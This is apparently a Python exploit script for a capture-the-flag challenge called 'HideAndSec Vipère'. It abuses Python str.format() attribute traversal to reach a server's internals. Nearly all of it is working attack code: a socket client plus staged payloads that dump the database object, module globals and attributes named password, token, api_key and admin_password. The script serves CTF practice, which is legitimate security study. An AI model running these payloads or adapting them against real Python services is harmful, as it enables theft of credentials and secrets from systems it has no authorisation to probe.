"""
=======================================================
  HideAndSec Vipère v1.26 - Flag Extractor
  Vulnerability: Python str.format() Attribute Traversal
=======================================================

USAGE:
  python exploit.py <target_host> [port]

  Example:
    python exploit.py challenge.ctf.com 1337

  Or manually via netcat:
    nc <target_host> 1337
    => {get_time.__self__.get_infected.__globals__[server].bridge.db.__dict__}
"""

import socket
import sys


def send_payload(host, port, payload):
    """Send a format string payload to the Vipère server and return the response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    try:
        sock.connect((host, port))
        # Consume the welcome banner + prompt
        data = b""
        while b"=> " not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk

        # Send the payload
        sock.sendall(payload.encode() + b"\n")

        # Receive the response
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"=> " in data or b"\n\n" in data:
                    break
            except socket.timeout:
                break

        response = data.decode(errors="replace")
        # Strip trailing prompt if present
        if "Which function" in response:
            response = response[:response.index("Which function")]
        return response.strip()
    finally:
        sock.close()


def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <target_host> [port]")
        print("Example: python exploit.py challenge.ctf.com 1337")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

    banner = r"""
╔══════════════════════════════════════════════════════════╗
║     HideAndSec Vipère v1.26 - Flag Extractor            ║
║     Python str.format() Attribute Traversal Exploit      ║
╚══════════════════════════════════════════════════════════╝
"""
    print(banner)
    print(f"[*] Target: {host}:{port}\n")

    # ---- Stage 1: Verify the vulnerability works ----
    print("[STAGE 1] Verifying vulnerability — accessing class name...")
    payload1 = "{get_time.__self__.__class__.__name__}"
    try:
        r = send_payload(host, port, payload1)
        print(f"  [+] Result: {r}")
        if "SecureCommands" in r:
            print("  [✓] Format string attribute traversal confirmed!\n")
        else:
            print("  [!] Unexpected result, proceeding anyway...\n")
    except ConnectionRefusedError:
        print(f"  [✗] Connection refused on {host}:{port}")
        sys.exit(1)
    except Exception as e:
        print(f"  [✗] Error: {e}")
        sys.exit(1)

    # ---- Stage 2: Dump the database object ----
    print("[STAGE 2] Extracting database credentials via server.bridge.db...")
    payload2 = "{get_time.__self__.get_infected.__globals__[server].bridge.db.__dict__}"
    try:
        r = send_payload(host, port, payload2)
        print(f"  [+] Database __dict__:\n  {r}\n")
    except Exception as e:
        print(f"  [✗] Error: {e}")

    # ---- Stage 3: Try to get individual attributes ----
    print("[STAGE 3] Trying to extract specific database attributes...")
    attrs_to_try = [
        "flag", "secret", "password", "credentials", "key",
        "total_infected", "connection_string", "host", "username",
        "token", "api_key", "admin_password",
    ]
    for attr in attrs_to_try:
        payload = "{get_time.__self__.get_infected.__globals__[server].bridge.db." + attr + "}"
        try:
            r = send_payload(host, port, payload)
            if r and "exception" not in r.lower() and "hack" not in r.lower():
                print(f"  [+] db.{attr} = {r}")
        except Exception:
            pass

    # ---- Stage 4: Dump module globals for additional secrets ----
    print("\n[STAGE 4] Dumping full module globals for hidden secrets...")
    payload4 = "{get_time.__func__.__globals__}"
    try:
        r = send_payload(host, port, payload4)
        print(f"  [+] Module globals (truncated to 2000 chars):\n  {r[:2000]}\n")
    except Exception as e:
        print(f"  [✗] Error: {e}")

    # ---- Stage 5: Try database module globals ----
    print("[STAGE 5] Accessing database module internals...")
    payload5 = "{get_time.__self__.get_infected.__globals__[server].bridge.db.__class__.__module__}"
    try:
        r = send_payload(host, port, payload5)
        print(f"  [+] Database module name: {r}")
    except Exception as e:
        print(f"  [✗] Error: {e}")

    # Try to access database module globals via __init__
    payload6 = "{get_time.__self__.get_infected.__globals__[server].bridge.db.__init__.__globals__}"
    try:
        r = send_payload(host, port, payload6)
        print(f"  [+] database module globals:\n  {r[:2000]}\n")
    except Exception as e:
        print(f"  [✗] Error: {e}")

    print("─" * 60)
    print("[✓] Exploit complete! Check the output above for the flag.")
    print("─" * 60)
    print()
    print("TIP: The flag is likely in one of:")
    print("  • db.__dict__ (Stage 2)")
    print("  • db.flag or db.secret (Stage 3)")
    print("  • database module globals (Stage 5)")


if __name__ == "__main__":
    main()
